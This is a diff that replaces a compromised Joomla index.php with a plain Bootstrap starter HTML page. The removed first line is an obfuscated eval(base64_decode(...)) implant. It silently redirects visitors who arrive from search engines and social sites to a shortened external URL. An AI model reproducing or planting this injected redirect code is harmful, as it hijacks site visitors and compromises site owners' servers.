@@ -1,88 +1,69 @@
-<?php eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9jeXpxZHlnIik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
-/**
-* @version		$Id: index.php 14401 2010-01-26 14:10:00Z louis $
-* @package		Joomla
-* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
-* @license		GNU/GPL, see LICENSE.php
-* Joomla! is free software. This version may have been modified pursuant
-* to the GNU General Public License, and as distributed it includes or
-* is derivative of works licensed under the GNU General Public License or
-* other free or open source software licenses.
-* See COPYRIGHT.php for copyright notices and details.
-*/
 
-// Set flag that this is a parent file
-define( '_JEXEC', 1 );
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- link rel="shortcut icon" href="assets/ico/favicon.ico" -->
 
-define('JPATH_BASE', dirname(__FILE__) );
+    <title>Starter Template for Bootstrap</title>
 
-define( 'DS', DIRECTORY_SEPARATOR );
+    <!-- Bootstrap core CSS -->
+    <link href="bootstrap-3.1.1/css/bootstrap.min.css" rel="stylesheet">
 
-require_once ( JPATH_BASE .DS.'includes'.DS.'defines.php' );
-require_once ( JPATH_BASE .DS.'includes'.DS.'framework.php' );
+    <!-- Custom styles for this template -->
+    <link href="starter-template.css" rel="stylesheet">
 
-JDEBUG ? $_PROFILER->mark( 'afterLoad' ) : null;
+    <!-- Just for debugging purposes. Don't actually copy this line! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
 
-/**
- * CREATE THE APPLICATION
- *
- * NOTE :
- */
-$mainframe =& JFactory::getApplication('site');
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  </head>
 
-/**
- * INITIALISE THE APPLICATION
- *
- * NOTE :
- */
-// set the language
-$mainframe->initialise();
+  <body>
 
-JPluginHelper::importPlugin('system');
+    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#">Project name</a>
+        </div>
+        <div class="collapse navbar-collapse">
+          <ul class="nav navbar-nav">
+            <li class="active"><a href="#">Home</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a href="#contact">Contact</a></li>
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </div>
 
-// trigger the onAfterInitialise events
-JDEBUG ? $_PROFILER->mark('afterInitialise') : null;
-$mainframe->triggerEvent('onAfterInitialise');
+    <div class="container">
 
-/**
- * ROUTE THE APPLICATION
- *
- * NOTE :
- */
-$mainframe->route();
+      <div class="starter-template">
+        <h1>Bootstrap starter template</h1>
+        <p class="lead">Use this document as a way to quickly start any new project.<br> All you get is this text and a mostly barebones HTML document.</p>
+      </div>
 
-// authorization
-$Itemid = JRequest::getInt( 'Itemid');
-$mainframe->authorize($Itemid);
+    </div><!-- /.container -->
 
-// trigger the onAfterRoute events
-JDEBUG ? $_PROFILER->mark('afterRoute') : null;
-$mainframe->triggerEvent('onAfterRoute');
 
-/**
- * DISPATCH THE APPLICATION
- *
- * NOTE :
- */
-$option = JRequest::getCmd('option');
-$mainframe->dispatch($option);
-
-// trigger the onAfterDispatch events
-JDEBUG ? $_PROFILER->mark('afterDispatch') : null;
-$mainframe->triggerEvent('onAfterDispatch');
-
-/**
- * RENDER  THE APPLICATION
- *
- * NOTE :
- */
-$mainframe->render();
-
-// trigger the onAfterRender events
-JDEBUG ? $_PROFILER->mark('afterRender') : null;
-$mainframe->triggerEvent('onAfterRender');
-
-/**
- * RETURN THE RESPONSE
- */
-echo JResponse::toString($mainframe->getCfg('gzip'));
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="../../dist/js/bootstrap.min.js"></script>
+  </body>
+</html>
